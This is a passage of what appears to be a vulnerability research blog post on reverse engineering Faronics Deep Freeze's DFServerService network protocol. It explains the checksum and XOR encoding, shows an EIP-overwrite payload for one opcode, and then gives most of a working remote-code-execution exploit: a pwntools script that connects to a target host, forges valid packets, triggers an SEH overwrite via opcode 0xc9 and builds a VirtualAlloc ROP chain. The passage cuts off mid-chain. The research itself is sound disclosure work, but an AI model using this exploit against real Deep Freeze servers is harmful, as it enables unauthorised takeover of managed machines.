+<p><img src="/images/faronics_ida12.jpg" alt="Faronics IDA in do_encrypt_and_checksum calling do_checksums"></p>
+<p>&ldquo;do_checksums&rdquo; will first check if checksum 1 (header 0x08 - 0x0b) is equals to 0x0a953 via the instruction <code>cmp dword ptr [edx+8], 0A958h</code>, before calling &ldquo;do_encode_three_checksum&rdquo; at 0x007A921C to proceed with the next check.</p>
+<p><img src="/images/faronics_ida13.jpg" alt="Faronics IDA in do_checksums"></p>
+<p>&ldquo;do_encode_three_checksum&rdquo; will calculate a checksum based on all the data starting from byte 0x14 onwards.</p>
+<p><img src="/images/faronics_ida14.jpg" alt="Faronics IDA in do_encode_three_checksum"></p>
+<p>I have translated the asm code logic into python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode_three</span>(msg, count):
+</span></span><span style="display:flex;"><span>    buffer <span style="color:#f92672">=</span> msg 
+</span></span><span style="display:flex;"><span>    variable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e">## edx</span>
+</span></span><span style="display:flex;"><span>    eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    counter <span style="color:#f92672">=</span> count
+</span></span><span style="display:flex;"><span>    var2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(count):
+</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">=</span> truncate(eax <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">=</span> buffer[i] <span style="color:#f92672">+</span> eax 
+</span></span><span style="display:flex;"><span>        variable <span style="color:#f92672">=</span> eax
+</span></span><span style="display:flex;"><span>        variable <span style="color:#f92672">=</span> variable <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF0000000</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> variable <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: 
+</span></span><span style="display:flex;"><span>            variable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>
+</span></span><span style="display:flex;"><span>            eax <span style="color:#f92672">=</span> variable <span style="color:#f92672">&amp;</span> eax
+</span></span><span style="display:flex;"><span>            counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: 
+</span></span><span style="display:flex;"><span>            var2 <span style="color:#f92672">=</span> variable
+</span></span><span style="display:flex;"><span>            variable <span style="color:#f92672">=</span> truncate(variable <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x18</span>)
+</span></span><span style="display:flex;"><span>            eax <span style="color:#f92672">=</span> truncate(eax <span style="color:#f92672">^</span> variable)
+</span></span><span style="display:flex;"><span>            var2 <span style="color:#f92672">=</span> complement(<span style="color:#f92672">~</span>var2)
+</span></span><span style="display:flex;"><span>            eax <span style="color:#f92672">=</span> eax <span style="color:#f92672">&amp;</span> var2 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> eax
+</span></span></code></pre></div><p>Back to &ldquo;do_checksums&rdquo;, once &ldquo;do_encode_three_checksum&rdquo; is complete, a check is done to make sure that the computed checksum is equal to the checksum provided in payload bytes 0x10 to 0x13. This is done via the <code>cmp edx, [ecx]</code> instruction.</p>
+<p>Once this is done, the opcode jumptable will finally be called!</p>
+<h4 id="opcode-jumptable">Opcode Jumptable</h4>
+<p>Back in &ldquo;do_encrypt_and_checksum&rdquo;, <code>.text:0045E42F call dword ptr [ecx+810h]</code> will call a function &ldquo;do_create_thread_call_jumptable&rdquo; at 0x0042E370, which will create a new thread, which will call a function &ldquo;do_fn_before_jumptable&rdquo; at 0x042F970, which will finally call the jumptable function at 0x0042FA18.</p>
+<p>Look at this absolutely horrifying giant function:</p>
+<p><img src="/images/faronics_ida15.jpg" alt="Faronics IDA jumptable"></p>
+<p>I then started trying to find opcodes which were potentially exploitable. There are many many ways to crash the binary, but I wanted something that would give me RCE. I mainly took a fuzzing approach to this, since there were really a lot a lot of opcodes.</p>
+<h4 id="the-rabbit-hole">The Rabbit Hole</h4>
+<p>I chanced upon opcode 0x1f6, which gave me my first crash and made me stupidly excited that I could finally pwn this damn thing. This would lead to a crash at 0x0043e2e7, as it tries to dereference edx, which is a register that we can control. Causing an invalid dereference will allow us to overwrite the SEH handler, and replacing edx with a valid pointer will give us a direct EIP overwrite!</p>
+<p>The data section of a payload to overwrite EIP would look something like this:</p>
+<pre tabindex="0"><code>data = p32(0x14) # Checksum 3
+data += p32(0xa958) ## Checksum 2
+data += p32(0x1f6) ## Opcode
+data += p32(size) ## Size (?)
+data += p32(size) ## Size (?)
+data += b&#34;ZZZZ&#34;
+data += p32(0x145) ## Second opcode for opcode 0x1f6
+data += cyclic(cyclic_find(&#34;aacc&#34;))
+data += p32(0xdeadbeef) ## EIP overwrite
+data += p32(0x0135faf0) ## Valid pointer for edx
+</code></pre><p>We can overwrite EIP with 0xdeadbeef, but naturally we would want to overwrite it with something that is actually useful. However, all the pointers in the DFServerService executable start with \x00, which is a bad character! This means that if we overwrite EIP with a pointer from DFServerService, we will no longer be able to control the value inside edx, hence the condition to cause the direct EIP overwriteg will not be fulfilled :(((</p>
+<p>I spent a lot of time thinking of ways around this, but could not, and sadly had to abandon this opcode and write it off as a Denial of Service instead of an RCE :((((</p>
+<h4 id="the-actual-vulnerable-opcode">The Actual Vulnerable Opcode</h4>
+<p>I then went back to fuzzing, and chanced upon opcode 0xc9. Spamming a lot of As gave me a SEH overwrite this time, which I could now use to kickstart my ROP chain :DDD</p>
+<p>Note that in this case, \x00 is not a bad character on its own, but \x00\x00 is a bad character. This is likely due to wchar being used, and \x00\x00 would equate to a &ldquo;wchar null byte&rdquo;.</p>
+<p>Now that we control EIP, we can create the VirtualAlloc skeleton and build our ROP chain and finally get a shell!</p>
+<p>The full exploit is here:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = &#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;192.168.185.10&#34;</span>, <span style="color:#ae81ff">7725</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">truncate</span>(num): 
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> num <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> num
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">complement</span>(val):
+</span></span><span style="display:flex;"><span>    nbits <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> val <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>: 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> val
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>: 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (val <span style="color:#f92672">+</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> nbits)) <span style="color:#f92672">%</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> nbits)    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bit_not</span>(n, numbits<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> numbits) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> n
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_key_xor1</span>(num):
+</span></span><span style="display:flex;"><span>    key_arr <span style="color:#f92672">=</span> [] 
+</span></span><span style="display:flex;"><span>    printable <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    seed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0c6e3d57</span> <span style="color:#75715e">## for meowmeow as the customization code</span>
+</span></span><span style="display:flex;"><span>    value2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>    seed <span style="color:#f92672">=</span> truncate(seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x15a4e35</span>)
+</span></span><span style="display:flex;"><span>    seed <span style="color:#f92672">=</span> truncate(seed <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num): 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: 
+</span></span><span style="display:flex;"><span>            part1 <span style="color:#f92672">=</span> seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x15a</span>
+</span></span><span style="display:flex;"><span>            part2 <span style="color:#f92672">=</span> seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4e35</span>
+</span></span><span style="display:flex;"><span>            part2_high <span style="color:#f92672">=</span> part2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>            part2_low <span style="color:#f92672">=</span> truncate(part2)
+</span></span><span style="display:flex;"><span>            part1 <span style="color:#f92672">=</span> truncate(part2_high <span style="color:#f92672">+</span> part1)
+</span></span><span style="display:flex;"><span>            part2_low <span style="color:#f92672">=</span> truncate(part2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            seed <span style="color:#f92672">=</span> part2_low
+</span></span><span style="display:flex;"><span>            value2 <span style="color:#f92672">=</span> truncate(part1)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: 
+</span></span><span style="display:flex;"><span>            part2 <span style="color:#f92672">=</span> value2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4e35</span>
+</span></span><span style="display:flex;"><span>            part1 <span style="color:#f92672">=</span> seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x15a</span>
+</span></span><span style="display:flex;"><span>            addition <span style="color:#f92672">=</span> truncate(truncate(part1) <span style="color:#f92672">+</span> truncate(part2))
+</span></span><span style="display:flex;"><span>            part3 <span style="color:#f92672">=</span> seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4e35</span>
+</span></span><span style="display:flex;"><span>            part3_high <span style="color:#f92672">=</span> part3 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>            part3_low <span style="color:#f92672">=</span> truncate(part3)
+</span></span><span style="display:flex;"><span>            addition <span style="color:#f92672">=</span> truncate(part3_high <span style="color:#f92672">+</span> addition)
+</span></span><span style="display:flex;"><span>            seed <span style="color:#f92672">=</span> truncate(part3_low <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            value2 <span style="color:#f92672">=</span> addition
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> value2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fffffff</span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> result <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x800000ff</span>
+</span></span><span style="display:flex;"><span>        key_arr<span style="color:#f92672">.</span>append(result)
+</span></span><span style="display:flex;"><span>        printable<span style="color:#f92672">.</span>append(hex(result))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(printable)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key_arr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_key_xor2</span>(num, header):
+</span></span><span style="display:flex;"><span>    key_arr <span style="color:#f92672">=</span> [] 
+</span></span><span style="display:flex;"><span>    printable <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    ax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num): 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: 
+</span></span><span style="display:flex;"><span>            quotient <span style="color:#f92672">=</span> header <span style="color:#f92672">//</span> <span style="color:#ae81ff">0xb1</span>
+</span></span><span style="display:flex;"><span>            remainder <span style="color:#f92672">=</span> header <span style="color:#f92672">%</span> <span style="color:#ae81ff">0xb1</span>
+</span></span><span style="display:flex;"><span>            ecx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xab</span> <span style="color:#f92672">*</span> remainder
+</span></span><span style="display:flex;"><span>            part1 <span style="color:#f92672">=</span> quotient <span style="color:#f92672">+</span> quotient
+</span></span><span style="display:flex;"><span>            neg <span style="color:#f92672">=</span> complement(ecx <span style="color:#f92672">-</span> part1)
+</span></span><span style="display:flex;"><span>            ax <span style="color:#f92672">=</span> neg <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>
+</span></span><span style="display:flex;"><span>            ax <span style="color:#f92672">=</span> ax <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fff</span>
+</span></span><span style="display:flex;"><span>        ax_quotient <span style="color:#f92672">=</span> ax <span style="color:#f92672">//</span> <span style="color:#ae81ff">0xb1</span> <span style="color:#75715e">## ecx</span>
+</span></span><span style="display:flex;"><span>        ax_remainder <span style="color:#f92672">=</span> ax <span style="color:#f92672">%</span> <span style="color:#ae81ff">0xb1</span> <span style="color:#75715e">## edx</span>
+</span></span><span style="display:flex;"><span>        ecx <span style="color:#f92672">=</span> truncate(ax_remainder <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xab</span>)
+</span></span><span style="display:flex;"><span>        ax <span style="color:#f92672">=</span> truncate(ax_quotient <span style="color:#f92672">+</span> ax_quotient) 
+</span></span><span style="display:flex;"><span>        ecx <span style="color:#f92672">=</span> truncate(complement(ecx <span style="color:#f92672">-</span> ax))
+</span></span><span style="display:flex;"><span>        ecx <span style="color:#f92672">=</span> ecx <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fff</span> <span style="color:#75715e">## eax</span>
+</span></span><span style="display:flex;"><span>        ax <span style="color:#f92672">=</span> ecx
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> ecx <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
+</span></span><span style="display:flex;"><span>        key_arr<span style="color:#f92672">.</span>append(result)
+</span></span><span style="display:flex;"><span>        printable<span style="color:#f92672">.</span>append(hex(result))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(printable)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key_arr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode</span>(msg): 
+</span></span><span style="display:flex;"><span>    key1 <span style="color:#f92672">=</span> gen_key_xor1(len(msg))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(msg)): 
+</span></span><span style="display:flex;"><span>        msg[i] <span style="color:#f92672">=</span> msg[i] <span style="color:#f92672">^</span> key1[i]
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    thing <span style="color:#f92672">=</span> u32(msg[:<span style="color:#ae81ff">4</span>], endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;little&#34;</span>)
+</span></span><span style="display:flex;"><span>    key2 <span style="color:#f92672">=</span> gen_key_xor2(len(msg)<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>, thing)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(msg)<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>): 
+</span></span><span style="display:flex;"><span>        msg[i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> msg[i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">^</span> key2[i]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> msg
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode_print</span>(dec): 
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Padding 1 (offset): &#34;</span> <span style="color:#f92672">+</span> hex(u32(dec[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">8</span>])))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Checksum 1: &#34;</span> <span style="color:#f92672">+</span> hex(u32(dec[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">12</span>])))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Padding 2: &#34;</span> <span style="color:#f92672">+</span> hex(u32(dec[<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">16</span>])))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Length (P1+P2): &#34;</span> <span style="color:#f92672">+</span> hex((u32(dec[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">8</span>]))<span style="color:#f92672">+</span>u32(dec[<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">16</span>])))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Checksum 4: &#34;</span> <span style="color:#f92672">+</span> hex(u32(dec[<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>]))) 
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Checksum 3: &#34;</span> <span style="color:#f92672">+</span> hex(u32(dec[<span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>])))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Checksum 2: &#34;</span> <span style="color:#f92672">+</span> hex(u32(dec[<span style="color:#ae81ff">6</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>])))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Opcode: &#34;</span> <span style="color:#f92672">+</span> hex(u32(dec[<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>])))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode_widestr</span>(msg): 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(msg[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(msg)))<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode_three</span>(msg, count):
+</span></span><span style="display:flex;"><span>    buffer <span style="color:#f92672">=</span> msg 
+</span></span><span style="display:flex;"><span>    variable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e">## edx</span>
+</span></span><span style="display:flex;"><span>    eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    counter <span style="color:#f92672">=</span> count
+</span></span><span style="display:flex;"><span>    var2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(count):
+</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">=</span> truncate(eax <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">=</span> buffer[i] <span style="color:#f92672">+</span> eax 
+</span></span><span style="display:flex;"><span>        variable <span style="color:#f92672">=</span> eax
+</span></span><span style="display:flex;"><span>        variable <span style="color:#f92672">=</span> variable <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF0000000</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> variable <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: 
+</span></span><span style="display:flex;"><span>            variable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>
+</span></span><span style="display:flex;"><span>            eax <span style="color:#f92672">=</span> variable <span style="color:#f92672">&amp;</span> eax
+</span></span><span style="display:flex;"><span>            counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: 
+</span></span><span style="display:flex;"><span>            var2 <span style="color:#f92672">=</span> variable
+</span></span><span style="display:flex;"><span>            variable <span style="color:#f92672">=</span> truncate(variable <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x18</span>)
+</span></span><span style="display:flex;"><span>            eax <span style="color:#f92672">=</span> truncate(eax <span style="color:#f92672">^</span> variable)
+</span></span><span style="display:flex;"><span>            var2 <span style="color:#f92672">=</span> complement(<span style="color:#f92672">~</span>var2)
+</span></span><span style="display:flex;"><span>            eax <span style="color:#f92672">=</span> eax <span style="color:#f92672">&amp;</span> var2 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> eax
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## SIZE IS HERE</span>
+</span></span><span style="display:flex;"><span>size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Send size of data packet</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> p32(size, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Generate xor keys</span>
+</span></span><span style="display:flex;"><span>key1 <span style="color:#f92672">=</span> gen_key_xor1(size<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1000</span>)
+</span></span><span style="display:flex;"><span>key2 <span style="color:#f92672">=</span> gen_key_xor2(size<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x73746163</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cats&#34;</span> <span style="color:#75715e">## XOR2 seed</span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x10</span>) <span style="color:#75715e">## Offset</span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x0a953</span>) <span style="color:#75715e">## Checksum 1</span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">+=</span> p32(size<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>) <span style="color:#75715e">## len(payload)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## 0x10-0x13: encode_three checksum</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x14</span>) <span style="color:#75715e"># Checksum 3</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xa958</span>) <span style="color:#75715e">## Checksum 2</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xc9</span>) <span style="color:#75715e">## Opcode</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> p32(size) <span style="color:#75715e">## Size</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> p32(size) <span style="color:#75715e">## Size</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Z&#34;</span><span style="color:#f92672">*</span>(cyclic_find(<span style="color:#e6db74">&#34;bkja&#34;</span>))
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00441ec6</span>) <span style="color:#75715e">## first ROP point -- xchg esp, eax ; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## ROP1: Write VirtualAlloc address</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Z&#34;</span><span style="color:#f92672">*</span>(cyclic_find(<span style="color:#e6db74">&#34;faaa&#34;</span>))
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00542afb</span>) <span style="color:#75715e">## ret 0x20</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x005039bd</span>) <span style="color:#75715e">## mov eax, edx ; ret</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x41414141</span>) <span style="color:#75715e">## VirtualAlloc</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x42424242</span>) <span style="color:#75715e">## Return address</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x43434343</span>) <span style="color:#75715e">## lpAddress</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x44444444</span>) <span style="color:#75715e">## dwSize</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x45454545</span>) <span style="color:#75715e">## flAllocationType</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x46464646</span>) <span style="color:#75715e">## flProtect</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Z&#34;</span><span style="color:#f92672">*</span>cyclic_find(<span style="color:#e6db74">&#34;caaa&#34;</span>)
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00402a35</span>) <span style="color:#75715e">## pop ebp ; ret</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffa8</span>) <span style="color:#75715e">## -0x58</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004e041b</span>) <span style="color:#75715e">## add eax, ebp ; ret</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006b500f</span>) <span style="color:#75715e">## mov edx, eax ; pop ebp ; ret</span>
